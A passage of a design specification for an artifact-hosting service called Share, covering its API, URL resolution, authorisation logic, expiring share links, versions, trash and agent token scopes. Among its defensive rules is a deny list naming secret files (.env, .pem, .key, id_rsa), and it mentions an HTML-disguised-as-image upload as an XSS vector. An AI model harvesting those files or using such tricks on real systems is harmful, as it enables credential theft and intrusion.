  "shareLinks": [ { "id": "lnk_…", "expiresAt": "…", "hasPassword": true,
                    "label": "Fairfield team", "viewCount": 3 } ],
  "grants": [ { "handle": "sarah", "createdAt": "…" } ],
  "seq": 2, "versionCount": 2, "fileCount": 3, "totalBytes": 112743,
  "entryPath": "/index.html", "tags": ["social","grokbot"],
  "ttlExpiresAt": null, "pinned": false,
  "viewCount": 41, "lastViewedAt": "…",
  "createdAt": "…", "updatedAt": "…",
  "createdBy": { "type": "token", "id": "shr_01J…", "name": "grokbot@hosta" }
}
```

`q` matches **name, title, description, and tags only** — never file contents (P5). Matching is
trigram-based so partial and misspelled words work (§8.7).

`files/content` streams a file with its recorded content type. This is how an agent inspects
what it posted without going through the artifact URL, and the only way to read a
password-protected artifact's bytes with a token.

## 5.9 Updating metadata

```
PATCH /api/v1/artifacts/{name}
```

Accepts any subset of `name`, `title`, `description`, `entryPath`, `tags`, `ttl`, `pinned`,
`allowFraming`, `csp`.
Absent fields are unchanged; `null` clears where nullable.

- Changing `name` moves the address immediately; the old one 404s. Share links keep working.
- Changing `entryPath` takes effect without reposting.
- `ttl` accepts a duration from now, an absolute timestamp, or `null` to clear.
- **Visibility is not settable here.** Sharing has its own endpoints (§7). A `PATCH` containing
  `visibility` or `shareLinks` is `422 use_share_endpoint` — a loud failure rather than a
  silent ignore.

## 5.10 Copying

```
POST /api/v1/artifacts/{name}/copy      { "name": "…", "title": "…" }
```

Creates a new artifact **in the caller's own space** whose first version references the same
files — zero bytes copied. Works on your own artifacts and on anything shared with you, which
is the "save a copy so it survives their deletion" path from §7.7.

The copy is always private with no share links, whatever the source had, and records
`copied_from`. Copying something shared with you is audited on both sides, and the original
owner sees it in their artifact's activity — no silent duplication of someone else's work.

## 5.11 Deleting

```
DELETE /api/v1/artifacts/{name}                 → to trash, restorable 30 days
DELETE /api/v1/artifacts/{name}?purge=true      → permanent, needs artifacts:delete
POST   /api/v1/artifacts/{name}/restore         → back from trash
```

Trashing revokes every share link and grant on the artifact immediately — a trashed artifact is
not viewable by anyone, including people who held a link. Restoring does **not** bring the
links back; they must be recreated. That asymmetry is deliberate: undoing a deletion should not
silently re-open access.

## 5.12 Error codes

| HTTP | Code | Meaning |
| --- | --- | --- |
| 400 | `file_hash_mismatch` | Uploaded bytes do not match the digest in the URL |
| 400 | `file_size_mismatch` | Uploaded length differs from the declared size |
| 403 | `upload_signature_invalid` | Signed URL expired or tampered |
| 403 | `not_your_artifact` | Write attempted against another space |
| 404 | `artifact_not_found` | No such name in the addressed space |
| 404 | `version_not_found` | No such version |
| 404 | `file_not_found` | Path not in the requested version |
| 409 | `name_taken` | Name in use, including by a trashed artifact |
| 409 | `files_missing` | Commit before all uploads finished |
| 409 | `upload_session_closed` | Already committed or aborted |
| 409 | `upload_session_expired` | Past its window |
| 409 | `idempotency_key_reused` | Same key, different body |
| 413 | `quota_exceeded` | User storage limit |
| 413 | `artifact_too_large` | One version over the artifact ceiling |
| 413 | `file_too_large` | One file over the file ceiling |
| 413 | `too_many_files` | Over the per-version file count |
| 422 | `invalid_name` | Failed the name pattern |
| 422 | `name_reserved` | Collides with a reserved path (§6.3) |
| 422 | `invalid_path` | A file path failed normalisation (§6.4) |
| 422 | `dotfile_rejected` | A file path began with a dot segment other than `/.well-known/` (§6.4) |
| 422 | `invalid_entry_path` | `PATCH` set an `entryPath` not present in the live version |
| 422 | `path_case_collision` | Two paths differ only by case |
| 422 | `invalid_archive` | Bundle held a symlink, device, or traversing path |
| 422 | `archive_ratio_exceeded` | Decompression bomb |
| 422 | `use_share_endpoint` | Visibility passed to `PATCH` |
| 429 | `too_many_uploads` | Over 16 concurrent on one session |
| 429 | `rate_limited` | See §10.2 |

---

# Part 6 — The URL Model, Resolution, and Serving

## 6.1 Four kinds of URL

Everything Share serves falls into one of four shapes, and they never overlap.

| Shape | Example | Who reaches it |
| --- | --- | --- |
| **Root space** | `share.c52.com/postcal` | The root user, signed in |
| **User space** | `share.c52.com/~sarah/deck` | Sarah signed in, plus anyone she granted |
| **Share link** | `share.c52.com/s/9fq2n4kw…` | Anyone holding it, until it expires |
| **Application** | `share.c52.com/~/artifacts` | Signed-in users |

## 6.2 Root and canonical forms

Every user has a handle, including the root user. The root user's artifacts resolve at **both**
`/postcal` and `/~robert/postcal`; the second is the canonical form and always exists. Everyone
else has only the `~handle` form.

This means the root flag is a routing convenience rather than a structural special case. If it
ever moved, existing root-form links would `301` to the canonical form rather than break, and
nothing in the data model would change.

The dashboard shows the short form for the root user because that is what they will type and
send.

## 6.3 The application namespace, and why `/~/`

Artifacts living at the root compete with the application's own pages: is `/settings` a
settings screen or an artifact named `settings`? A reserved-word list would then have to grow
every time a page is added, and adding a page could break a URL already sent to someone.

The fix is that the application lives under **`/~/`** — a bare tilde, which cannot be a handle,
so collision is impossible by construction rather than by list maintenance.

```
/~/artifacts      /~/artifacts/{name}    /~/shared       /~/trash
/~/search         /~/tokens              /~/settings     /~/security
/~/authorize      /~/help                /~/users
```

The complete reserved list is therefore small and fixed:

```
~   s   api   mcp   auth   internal   .well-known   robots.txt   favicon.ico
```

Handles additionally may not be any of: `www`, `admin`, `root`, `system`, `support`, `help`,
`about`, `status`, `null`, `undefined`.

## 6.4 Path normalisation

Applied to every declared file path at post time, and to every request path at serve time.
Failure is `422 invalid_path` (post) or `404` (serve).

1. Convert `\` to `/`; percent-decode once, then reject any remaining `%` that would decode
   further (double-encoding is always an attack).
2. Reject any segment equal to `.` or `..`, any empty segment, any Windows drive prefix.
3. Reject NUL and any control character below `0x20`.
4. Apply Unicode NFC; reject characters in the Unicode `Cf` category (homograph tricks in file
   listings).
5. Reject a path over 1,024 bytes UTF-8, any segment over 255 bytes, or more than 32 segments.
6. **Case-collision check at post time:** two paths in one manifest differing only by case are
   `422 path_case_collision`. The store is case-sensitive; agents on macOS routinely produce
   manifests that cannot round-trip.
7. Paths beginning with a dot segment — `/.git/`, `/.env`, `/.ssh/` — are **rejected** at post
   time with `422 dotfile_rejected`. `/.well-known/` is the sole exception and is served
   normally.

Stored form: leading slash, no trailing slash.

The CLI additionally refuses to walk `.git`, `.env*`, `*.pem`, `*.key`, `id_rsa*`,
`node_modules`, `__pycache__`, and `.DS_Store` before a manifest is ever built (§9.5). Server
rules are the backstop; the client rule is what actually catches the mistake.

## 6.5 Resolution and the authorize algorithm

`/internal/authorize` is the single decision point for artifact requests. Complete logic, in
order. Steps 2 and 3 must not be reordered — resolving before checking access is what creates
timing oracles.

```python
def authorize(path, headers, client_ip) -> Response:
    # 1. Which space, and what remains of the path?
    #    /~sarah/deck/style.css  → space=sarah, rest=/deck/style.css
    #    /postcal/style.css      → space=root,  rest=/postcal/style.css
    space, rest = split_space(path)
    if space is None:
        return not_found()

    # 2. Longest-prefix artifact match. '/q3/report/img/a.png' tries
    #    'q3/report/img/a.png', then 'q3/report/img', then 'q3/report' — first hit wins.
    artifact, filepath = resolve_longest_prefix(space, rest)
    if artifact is None or artifact.trashed or artifact.ttl_expired_now():
        return not_found()

    # 3. Access check, before anything else about the artifact is consulted.
    actor = identify(headers)          # session | recipient session | none
    if not can_view(actor, artifact):
        return not_found()             # P1: identical to step 2's response

    # 4. File resolution within the version (§6.6).
    resolved = resolve_file(artifact.live_version, filepath)
    if resolved is None:
        return not_found_in_artifact(artifact)

    # 5. Serve.
    return ok(file=blob_path(resolved.sha256),
              content_type=resolved.content_type,
              cache_control=cache_for(artifact, actor, resolved),
              disposition=disposition_for(resolved),
              csp=csp_for(resolved))
```

`can_view` is the whole access model, and it is four lines:

```python
def can_view(actor, artifact):
    if actor.is_user and actor.user_id == artifact.user_id:        return True   # owner
    if actor.is_user and has_live_grant(artifact, actor.user_id):  return True   # shared with
    if actor.is_recipient and actor.link.artifact_id == artifact.id
       and actor.link.live():                                      return True   # share link
    return False
```

There is no fifth case. No admin bypass, no "public" flag, no network exemption.

### 6.5.1 Longest-prefix matching

Because names may contain slashes, `/q3/report/img/a.png` is ambiguous between "artifact
`q3/report`, file `/img/a.png`" and "artifact `q3/report/img/a.png`". Longest match wins, which
makes it deterministic. The candidate set is at most 8 lookups (the segment limit), all against
the unique index on `(user_id, name)`, and the whole resolution is cached for 60 seconds.

Posting an artifact whose name is a strict prefix of an existing artifact's name is allowed but
returns a `shadowing_name` warning — `q3/report` shadows nothing, but creating `q3` when
`q3/report` exists means `/q3/report` now resolves to a file inside `q3` if one is there.

### 6.5.2 Indistinguishability

P1 requires that an artifact you cannot see is indistinguishable from one that never existed.
Three things make that true:

1. **Identical body** — the same not-found page, no artifact-specific content.
2. **Identical headers** — no `X-Share-Artifact`, no differing cache directives.
3. **Comparable timing** — negative resolutions are cached in Redis with the same TTL as
   positive ones, and on a cache miss the same indexed queries run. T-PRIV-01 measures both
   paths over 1,000 requests and asserts a median difference under 2 ms.

## 6.6 Serving files

### 6.6.1 Resolution within a version

Given the remaining path `P` and the live version's manifest `M`:

1. `P` is empty or `/` → serve `entry_path`; if none, render the listing page.
2. Exact match in `M` → serve it.
3. `P` ends in `/` → try `P + "index.html"`.
4. `P + "/index.html"` exists → `308` to `P + "/"`, preserving the query string, so relative
   links inside the document resolve.
5. `P + ".html"` exists → serve it.
6. `/404.html` exists in the artifact → serve it with status `404`.
7. Otherwise the standard not-found page with status `404`.

There is no SPA fallback. Share hosts artifacts, not applications (N1), and a catch-all that
returns HTML for a missing `.json` causes more confusion than it prevents.

### 6.6.2 The listing page

When a bundle has no entry point, its root renders a plain file listing — name, size, type,
one link each — styled with the same inline CSS as the error pages, no external requests.
This is also what a multi-file, non-HTML artifact looks like: post three PDFs together and the
artifact root is a tidy index of them.

Listings are only ever shown for the artifact being addressed. There is no listing of a space,
ever, for anyone.

### 6.6.3 Content types

The manifest's `contentType` wins; otherwise it derives from the extension.

| Ext | Type | | Ext | Type |
| --- | --- | --- | --- | --- |
| `.html` `.htm` | `text/html; charset=utf-8` | | `.pdf` | `application/pdf` |
| `.css` | `text/css; charset=utf-8` | | `.json` | `application/json` |
| `.js` `.mjs` | `text/javascript; charset=utf-8` | | `.txt` `.md` | `text/plain; charset=utf-8` |
| `.svg` | `image/svg+xml` | | `.csv` | `text/csv; charset=utf-8` |
| `.png` `.jpg` `.jpeg` `.webp` `.gif` `.avif` | the image type | | `.woff2` | `font/woff2` |
| `.mp4` `.webm` `.mov` | the video type | | `.wasm` | `application/wasm` |
| `.mp3` `.m4a` `.wav` | the audio type | | anything else | `application/octet-stream` |

Sanitising rules, applied to every response:

- `X-Content-Type-Options: nosniff` always.
- A declared `text/html` on a path with an image, video, or font extension is **coerced** to the
  extension's type. Uploading an HTML payload named `logo.png` and declaring it HTML is stored
  XSS on the artifact's own origin; the extension wins.
- `.svg` is served with `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`
  so scripts inside SVG are inert.
- Any type not in the table and not explicitly declared is `application/octet-stream` with
  `Content-Disposition: attachment` — unknown binaries download rather than render.

Compressible for precompression: `text/*`, `application/json`, `application/xml`,
`application/javascript`, `image/svg+xml`, `application/wasm`. Never images, video, audio, or
PDFs.

### 6.6.4 Range requests and video

Caddy's `file_server` handles `Range`, `If-Range`, and multipart ranges natively, which is what
makes seeking work in a video element. The authorisation call runs first, once, per request;
the byte serving happens afterwards with no application involvement. A 2 GB MP4 therefore
streams at disk speed, and a seek is a fresh authorised range request.

Video artifacts get no transcoding, no thumbnail generation, and no probing — Share does not
open the file (P5). The dashboard's video viewer uses a native `<video>` element and whatever
the browser can play. The docs say plainly that H.264/AAC in MP4 is the format that works
everywhere.

### 6.6.5 Cache-Control

| Case | Header |
| --- | --- |
| Owner or grantee viewing their own artifact | `private, max-age=300` |
| Any file reached through a share link | `private, no-store` |
| Immutable-looking asset (content hash in the filename) | `private, max-age=31536000, immutable` |
| The listing page and error pages | `no-store` |

Everything is `private`. Nothing Share serves may be cached by a shared proxy, because
everything requires authorisation. `ETag` is the file's SHA-256; `Last-Modified` is the
version's creation time. Conditional requests return `304` from Caddy — the authorize call
still ran, so a `304` on an artifact whose access was just revoked cannot happen.

`no-store` on share-link responses prevents a borrowed browser or an intermediary from
retaining a document after the link dies.

### 6.6.6 Constant headers

Set in Caddy (§2.4) on every artifact response:

```
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Robots-Tag: noindex, nofollow
Permissions-Policy: interest-cohort=()
```

Deliberately absent: `Server`, anything naming a version, an owner, or an artifact ID.

`X-Frame-Options` is `SAMEORIGIN` by default. An artifact may opt out by posting with
`"allowFraming": true`, which is needed for a dashboard someone embeds elsewhere. Artifacts
reached through a **password-protected** share link may not opt out — framing a password gate
is a credential-theft path — and the flag is ignored with a warning.

Share imposes no default `Content-Security-Policy` on artifact content, because
agent-generated pages routinely use inline styles and scripts and a default would break most of
them silently. An artifact may declare its own `csp` string at post time and it is served
verbatim.

## 6.7 robots.txt

`GET /robots.txt` is served by the API, always, and always returns:

```
User-agent: *
Disallow: /
```

There is no per-artifact override and no `indexable` flag. Nothing here is meant to be found by
search; the artifacts that are public are protected by link entropy, and an indexed share link
would defeat that completely.

## 6.8 Serving error codes

| HTTP | Code | Meaning |
| --- | --- | --- |
| 401 | `recipient_auth_required` | Share link needs its password |
| 401 | `recipient_auth_failed` | Wrong password |
| 404 | `not_found` | Everything indistinguishable: unknown name, no access, expired TTL, revoked link, missing file |
| 410 | `link_expired` | **Only** on the `/s/{token}` entry page, where a recipient benefits from knowing the link died rather than being told the artifact never existed. Never leaks the artifact's name or owner (§7.6) |
| 429 | `rate_limited` | §10.2 |

---

# Part 7 — Sharing: Links, Passwords, Expiry, and Grants

## 7.1 Three levels, and the decision behind them

Every artifact sits at exactly one of three levels at any moment. The owner chooses, per
artifact, and can change it at any time.

| Level | Who gets in | How |
| --- | --- | --- |
| **Private** | The owner, and anyone they granted | Signed in. The default, and where most things stay |
| **Link** | Anyone holding the link | A 128-bit token in the URL. No sign-in |
| **Link + password** | Anyone holding the link *and* the password | The token plus a shared secret, given separately |

The interface never merges these into a toggle. Sharing is an object you create, name, list,
and revoke — the same way you'd think about handing out a key rather than flipping a switch.

**Every share link expires.** There is no permanent option, no configuration flag to enable
one, and no override in the API. This is guarantee P4 and it exists because of how links
actually leak: not by being guessed, but by being forwarded, saved into a folder, screenshotted,
and archived. A link that stopped working in February is a non-event in an archive discovered
three years later.

## 7.2 Links address the artifact, not the name

A share link points at `artifact_id`. Renaming an artifact, changing its title, or reposting new
content does not affect any live link — the recipient's URL keeps working and now shows the new
version. That is deliberate: a client given a link to a report should keep seeing the current
report, and the owner should be free to reorganise their own namespace without breaking
promises they made to other people.

The corollary is that a share link **follows content updates**. If an agent reposts an artifact
with something that should not have gone out, live links show it immediately. The mitigation is
that the artifact screen (§11.7) always shows live links prominently, so an owner reposting can
see who is currently watching.

## 7.3 Creating a link

```
POST /api/v1/artifacts/{name}/links
Authorization: Bearer shr_…            (requires scope share:create)
```

```json
{
  "ttl": "14d",
  "password": null,
  "label": "Fairfield listing team",
  "maxViews": null
}
```

| Field | Required | Default | Notes |
| --- | --- | --- | --- |
| `ttl` | no | `SHARE_DEFAULT_SHARE_TTL` (14d) | `30m`, `24h`, `14d`, `180d`. Capped at `SHARE_MAX_SHARE_TTL` |
| `password` | no | none | `true` to have one generated and returned once; a string to set your own (≥8 chars) |
| `label` | no | — | The owner's note about who this is for. Shown only to the owner |
| `maxViews` | no | none | Burn after N distinct viewer-days. Optional and rarely wanted |

**Response `201`:**

```json
{
  "id": "lnk_01JAV…",
  "url": "https://share.c52.com/s/9fq2n4kwPz3mXr7bTvQ8dL",
  "expiresAt": "2026-09-07T18:04:00Z",
  "hasPassword": true,
  "password": "civil-marmot-71",
  "label": "Fairfield listing team",
  "artifact": { "name": "postcal", "title": "Q4 posting calendar" },
  "warnings": []
}
```

The password is returned **once**, at creation, and never again by any endpoint. Losing it
means creating a new link.

**So is the URL.** Only the token's SHA-256 and an 8-character display prefix are stored, so
Share cannot show a link's full address after the response that created it. The dashboard keeps
it in memory for the current session and says plainly that it cannot be recovered later; the
remedy for a lost URL is a new link and a revoked old one. This is the same property that makes
a stolen database dump useless for reaching anyone's artifacts.

Server behaviour: require `share:create`; generate a 128-bit token from a CSPRNG and store only
its SHA-256; hash the password with argon2id (`m=64MiB, t=3, p=1`); write the audit event
`link.create` with actor, token ID, IP, artifact, expiry, and whether a password was set (P3);
email the owner if `settings.notifyOnShare` is true, which is the **default**.

That notification matters more than it looks. It means the owner learns, by email, every time
anything of theirs becomes reachable without a sign-in — including when an agent does it.

### 7.3.1 Token entropy

128 bits, base58-encoded to 22 characters, from `secrets.token_bytes`. Base58 rather than
base64url so the token survives being read aloud, double-clicked, or wrapped in an email
without ambiguous characters. At that size, guessing is not a threat model — the threat is
forwarding, which expiry handles.

## 7.4 Passwords on links

- argon2id, never retrievable, write-only through the API.
- Generated passwords are `{adjective}-{noun}-{2 digits}` from curated word lists — readable
  over the phone, roughly 24 bits, which is adequate because attempts are rate-limited to 10
  per IP per hour and 50 per link per hour and the owner can revoke instantly.
- Owner-supplied passwords need 8 characters and nothing else. No composition rules.
- The gate is served at `401` on the link's own path and posts to `/s/{token}/unlock`,
  accepting form-encoded or JSON, so it works with JavaScript disabled.
- Changing or removing a link's password revokes every recipient session on that link (P9).

```
PATCH  /api/v1/links/{id}     { "password": "new-secret", "ttl": "7d", "label": "…" }
DELETE /api/v1/links/{id}                                        → revoke, immediate
GET    /api/v1/artifacts/{name}/links                            → list, owner only
```

Extending adds to the current expiry rather than starting from now, so an extension can never
silently shorten. **The cap applies to total lifetime** — `expires_at − created_at` may never
exceed `SHARE_MAX_SHARE_TTL` — so repeated extensions cannot walk a link past the ceiling. Revocation deletes recipient sessions and purges the Redis cache in the same
call — the next request from anyone holding that link is a `410`.

## 7.5 Expiry

The worker sweeps every 5 minutes:

```sql
UPDATE share_link SET revoked_at = now()
WHERE revoked_at IS NULL AND expires_at <= now()
RETURNING id, artifact_id;
```

For each: delete recipient sessions, purge the cache, audit `link.expired` with
`actor_type='system'`, and email the owner (§12.9 `link_ended`).

Because the sweep lags by up to 5 minutes, **`/internal/authorize` also checks `expires_at`
inline on every request** and refuses immediately when it has passed, regardless of what the
row says. The sweep is bookkeeping; the inline check is enforcement. T-EXP-02 verifies a link
is dead the second after expiry even if the sweep has not run.

Twenty-four hours before expiry the owner gets an email with a one-click extend. Links expiring
within 48 hours appear in a dashboard banner (§11.5).

## 7.6 What a recipient can learn

A share link deliberately reveals as little as possible:

- The URL contains no owner handle, no artifact name, and no artifact ID.
- The password gate names nothing — not the artifact, not who sent it, not the file type.
- Assets load under `/s/{token}/…`, so a recipient viewing a bundle never sees the artifact's
  real path.
- A revoked or expired link returns `410 link_expired` **only on the link's own entry page**,
  with a page that says the link is no longer active and nothing else. Everywhere else in the
  system an inaccessible thing is a `404` (P1); this is the one exception, because a recipient
  who was legitimately given a link benefits from knowing it died rather than being told it
  never existed, and the disclosure is limited to "some link that used to work no longer does".

## 7.7 Grants: sharing with another user

Separate from links, and safer, because there is no bearer token to forward.

```
POST   /api/v1/artifacts/{name}/grants     { "handle": "sarah", "note": "the Q4 draft" }
GET    /api/v1/artifacts/{name}/grants
DELETE /api/v1/grants/{id}
```

The artifact appears in Sarah's **Shared with me** (`GET /api/v1/artifacts?shared=true`) and
she reaches it at its canonical URL, `/~robert/postcal`, signed in as herself. She can view,
download, and copy it. She cannot edit, rename, delete, share it onward, or see anything else
in Robert's space.

Revoking a grant takes effect on her next request.

### 7.7.1 Shared is not permanent

The owner can delete the artifact at any moment and the grantee's access goes with it. That is
correct — it is the owner's file — and it means "shared with me" is a view, not a possession.
So the grantee gets a **Save a copy** action (§5.10), which pulls the artifact into their own
space as their own artifact, referencing the same stored bytes and therefore costing nothing.

The dashboard puts that action on every shared item precisely because the failure mode is
silent: a link that will stop working someday looks identical to one that will not.

## 7.7.2 One definition of "live"

A share link is **live** when `revoked_at IS NULL AND expires_at > now()`. A grant is live when
`revoked_at IS NULL`. That single predicate is used everywhere — the authorize path, the expiry
sweep, the derived `visibility` field, the `hasLink` search filter, and every count shown in the
dashboard. There is no second, looser notion of live anywhere in the system.

## 7.8 Visibility as displayed

The `visibility` field on an artifact is derived, never stored:

| Value | Condition | Shown as |
| --- | --- | --- |
| `private` | No live links, no live grants | Private |
| `granted` | Live grants, no live links | Shared with *n* people |
| `shared` | At least one live link | Link active · expires *date* |

When several apply, `shared` wins, because a live link is the widest thing true about the
artifact and the owner should see the widest thing first.

## 7.9 What an agent can and cannot do

By default an agent token holds `artifacts:read` and `artifacts:write` and **not**
`share:create`. It can post, overwrite, tag, and trash its own owner's artifacts. It cannot
create a share link, cannot grant to another user, and cannot extend an existing link.

An agent asked to "share this with my client" therefore fails with `403 insufficient_scope`
naming `share:create`, and the correct response is for it to hand the owner a dashboard link
to do it. That is the intended shape: putting something in front of a person outside the
system is a human decision.

Tokens can be granted `share:create` deliberately, in the dashboard, with a warning attached
(§12.6). Doing so is audited.

**Scopes constrain tokens, not people.** A signed-in user always holds full authority over
their own space, including sharing — there is no scope on a session and no dashboard state in
which the owner is refused an action on their own artifact. Scopes exist to limit what an agent
can do while acting as its owner.

## 7.10 Sharing error codes

| HTTP | Code | Meaning |
| --- | --- | --- |
| 403 | `insufficient_scope` | Token lacks `share:create` |
| 403 | `not_your_artifact` | Sharing something in another space |
| 404 | `link_not_found` | No such link, or already revoked |
| 404 | `grant_not_found` | No such grant |
| 404 | `user_not_found` | No user with that handle to grant to |
| 409 | `grant_exists` | Already shared with that user |
| 409 | `cannot_grant_to_self` | Granting to your own account |
| 410 | `link_expired` | Link past expiry or revoked (entry page only) |
| 422 | `ttl_too_long` | Beyond `SHARE_MAX_SHARE_TTL` |
| 422 | `password_too_short` | Under 8 characters |
| 422 | `artifact_trashed` | Cannot share something in the trash |
| 429 | `rate_limited` | §10.2 |

---

# Part 8 — Versions, Trash, Retention, and Search

## 8.1 Why these four are one part

They are the answer to a single question: *agents have full control over their own space, so
what stops a bad loop from destroying a year of work?* Versions make overwrites reversible,
trash makes deletes reversible, retention keeps both from becoming unbounded, and search makes
the result findable. Take any one away and full agent CRUD stops being safe.

## 8.2 Versions

Every commit creates an immutable version with a human-facing sequence number starting at 1.
Overwriting `postcal` produces version 2; version 1 remains, complete, and viewable.

```
GET /api/v1/artifacts/{name}/versions
```

```json
{
  "items": [
    { "id": "ver_01JAV…", "seq": 2, "isLive": true,
      "fileCount": 3, "totalBytes": 112743, "note": "November slots",
      "createdAt": "2026-08-24T18:04:00Z",
      "createdBy": { "type": "token", "id": "shr_01J…", "name": "grokbot@hosta" },
      "changes": { "added": 0, "modified": 1, "removed": 0 } }
  ],
  "nextCursor": null, "hasMore": false
}
```

`changes` compares manifests against the preceding version and is cached for 24 hours.

```
GET  /api/v1/artifacts/{name}/versions/{id}/files
GET  /api/v1/artifacts/{name}/versions/{id}/files/content?path=/index.html
POST /api/v1/artifacts/{name}/versions/{id}/restore   { "note": "back out the bad run" }
POST /api/v1/artifacts/{name}/versions/{id}/pin
DELETE /api/v1/artifacts/{name}/versions/{id}
```

**Restore** creates a *new* version whose manifest equals the old one, with the sequence
continuing — restoring version 1 while 3 is live produces version 4. History stays append-only,
so "what was live in March" always has an answer. No bytes move; a restore is a metadata copy
and completes in well under a second.

What restore carries and what it does not:

| Carried from the restored version | Left as it is now |
| --- | --- |
| Files and manifest | Share links and grants |
| `entryPath` | Name, title, description, tags |
| | TTL and pinned state |

Rolling back content must never silently change who can see something. That asymmetry is the
same one in §5.11: undoing does not re-open access, and it does not close it either.

**Preview.** A non-live version is viewable in the dashboard through
`/~/artifacts/{name}/versions/{id}/preview`, which streams files through the API rather than
mounting them at a public path. There are no per-version hostnames and no preview tokens — the
earlier draft had both and they existed only because artifacts were on wildcard subdomains,
which they no longer are. The signed-in owner is the only audience, so an authenticated proxy
route is simpler and leaks nothing.

The live version cannot be deleted (`409 version_is_live`). Deleting any other is soft, then
hard after the trash window.

## 8.3 Version retention

Per-user, in `settings.versionRetention`:

| Setting | Default | Meaning |
| --- | --- | --- |
| `keepLast` | 20 | Always keep the N most recent versions of an artifact |
| `keepDays` | 365 | Always keep anything newer than N days |
| `keepPinned` | `true` | Pinned versions are never pruned |
| `minimum` | 3 | Never reduce an artifact below this many versions |

The nightly job soft-deletes versions failing every test. It never touches the live version.
Defaults are generous because files are deduplicated: twenty versions of a calendar that
changes a few lines a week cost twenty copies of one small HTML file and nothing else.

## 8.4 Trash

Deleting an artifact sets `trashed_at`. While trashed it is:

- invisible at its URL — `404` to everyone, including anyone holding a link;
- absent from listings, search, and "shared with me";
- listed only in `GET /api/v1/artifacts?trashed=true` and the trash screen (§11.15);
- still holding its name, so the name cannot be reused until it leaves the trash;
- still counted against storage quota.

`POST /api/v1/artifacts/{name}/restore` brings it back with its versions intact. Share links
and grants are **not** restored — trashing revoked them, and restoring does not un-revoke.

After `SHARE_TRASH_DAYS` (default 30) the nightly job hard-deletes: rows go, reference counts
drop, and the next collection pass removes any bytes nothing else references.

`DELETE /api/v1/artifacts/{name}?purge=true` skips the trash entirely. It requires the separate
`artifacts:delete` scope, is audited as `artifact.purge`, and is the path guarantee P8 is
tested against. Agent tokens do not hold that scope by default, so **the worst a runaway agent
can do is fill the trash**, which is a Tuesday afternoon and an undo, not a disaster.

Trash has its own storage figure on the trash screen, because a user near quota should be able
to see that emptying it is the fix.

## 8.5 Artifact TTL

Distinct from share-link expiry. An artifact may carry its own `ttlExpiresAt`, meaning the thing
itself is temporary.

- Default is `null`: artifacts live until deleted. The posting calendar is not scratch.
- An agent posting throwaway output sets `"ttl": "30d"` and the artifact self-trashes.
- Expiry moves the artifact **to the trash**, not to deletion, so the 30-day recovery window
  still applies. An expired artifact is therefore recoverable for a month.
- The sweep runs every 15 minutes; `/internal/authorize` also checks inline, so an expired
  artifact is unreachable immediately.
- The owner is emailed 24 hours before an artifact with a TTL expires, but only when it has
  live share links or grants — otherwise the notification is noise about the owner's own
  scratch files.
- Setting `ttl` on an artifact with live share links returns a `ttl_with_live_links` warning:
  the links will die with it.

## 8.6 Staleness

Not a reaper. A view.

The worker recomputes nightly: for each user, artifacts with no view in *N* days (default 90),
excluding pinned ones and anything with a live link or grant. The dashboard surfaces the count
and total size — "34 artifacts you haven't opened in 90 days · 2.1 GB" — with a screen listing
them, sortable by size, and multi-select delete.

Nothing is ever deleted by this mechanism. Deleting things the owner did not ask to delete is
how a tool loses trust, and the trash exists precisely so that the owner can be decisive without
being careful.

## 8.7 Search

Metadata only. Artifact contents are never read, indexed, embedded, or classified (P5).

```
GET /api/v1/artifacts?q=calendar&tag=social&kind=bundle&owner=sarah
    &createdAfter=2026-06-01&hasLink=true&sort=updated_desc
```

| Filter | Matches |
| --- | --- |
| `q` | Name, title, description, and tags. Trigram-based, so partial words and typos work |
| `tag` | Exact tag, repeatable (AND) |
| `kind` | `bundle`, `page`, `document`, `image`, `video`, `file` |
| `owner` | Handle. Only ever returns artifacts you own or that are shared with you |
| `createdBefore` / `createdAfter` / `updatedBefore` / `updatedAfter` | Dates |
| `hasLink` | Artifacts with at least one live share link |
| `token` | Which agent token posted it |
| `trashed`, `shared`, `pinned` | Scope switches |
| `sort` | `updated_desc` (default), `created_desc`, `name_asc`, `size_desc`, `views_desc` |

Ranking for `q`: exact name match, then name prefix, then trigram similarity on name, then on
title, then on description. Tags match exactly and boost. The scoring is a single SQL
expression over the `pg_trgm` indexes in §3.4 — no search engine, no separate index to keep in
sync, no reindex job.

**What search cannot do, stated in the docs:** find an artifact by a phrase inside a PDF or a
sentence in an HTML report. That is the direct cost of P5 and it is the right trade for this
instance, but it means naming and tagging matter. The MCP tool description tells agents to
supply a title and tags on every post for exactly this reason (§9.3).

Search is scoped to the caller: their own artifacts plus anything granted to them. There is no
instance-wide search, not even for the root user, because a search that crosses spaces is a
listing of someone else's work.

## 8.8 Activity on an artifact

```
GET /api/v1/artifacts/{name}/activity
```

Merges audit events and daily view rollups for one artifact into a single reverse-chronological
feed: posted, overwritten, renamed, shared, link created or revoked, granted, copied, viewed
(*n* times on a date, via which link). This is what the artifact screen's activity tab shows
(§11.7), and it is the answer to "who has actually opened the thing I sent".

View entries carry counts and dates, never identities or addresses — the daily salted hash
(§3.8) supports "3 viewers on Tuesday" and cannot support "which three".

## 8.9 Error codes

| HTTP | Code | Meaning |
| --- | --- | --- |
| 404 | `version_not_found` | No such version |
| 409 | `version_is_live` | Deleting the live version |
| 409 | `version_deleted` | Restoring or previewing a deleted version |
| 409 | `artifact_not_trashed` | Restore called on something not in the trash |
| 409 | `name_taken` | Restoring when the name has been reused |
| 422 | `invalid_ttl` | Unparseable duration or a past timestamp |
| 422 | `invalid_filter` | Unsupported search parameter or sort |
| 422 | `restore_files_missing` | A file the target version needs was purged |

---

# Part 9 — The Agent Surface: MCP and CLI

## 9.1 Order of precedence

The HTTP API of Part 5 is the product. Two front doors sit on it, and **neither has a
capability the other lacks**:

1. **Remote MCP** — `https://share.c52.com/mcp`, streamable HTTP, bearer token. Nothing to
   install. This is the primary path and the one the docs lead with.
2. **CLI** — `share`, a single binary. Full parity with MCP, plus the things a shell needs.

An earlier draft had a stdio MCP server as an afterthought behind a CLI-first design. That was
backwards: a stdio server needs a local process, which is the same distribution problem the CLI
has, and it cannot be reached at all by a cloud-hosted agent. A remote endpoint with a token
works identically from Claude Code on a Mac Mini, a Cursor-routed cloud agent, a Grok session,
or someone else's machine entirely.

### 9.1.1 What still needs the CLI

Worth stating plainly, because "MCP first" is sometimes read as "MCP only":

- CI runners, cron jobs, Makefiles, git hooks — no MCP host process exists.
- A human at a terminal wanting to push a directory without an agent in the loop.
- Large directories, where walking the tree locally and sending only changed files is the whole
  point — a remote MCP server cannot see the caller's filesystem.
